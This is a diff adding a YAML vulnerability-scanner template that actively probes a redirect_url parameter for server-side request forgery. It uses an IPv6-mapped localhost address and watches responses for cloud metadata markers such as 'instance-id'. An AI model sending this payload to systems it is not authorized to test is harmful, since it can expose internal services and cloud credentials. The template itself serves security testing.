@@ -1,0 +1,22 @@
+id: patt-ssrf-ipv6-01-redirect_url
+name: 'PATT ssrf patt-ssrf-ipv6-01 via redirect_url'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - protoipv6
+description: 'PATT Bypass Localhost with IPv6 Notation. [patt:patt-ssrf-ipv6-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      redirect_url:
+        - 'http://[::ffff:127.0.0.1]/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
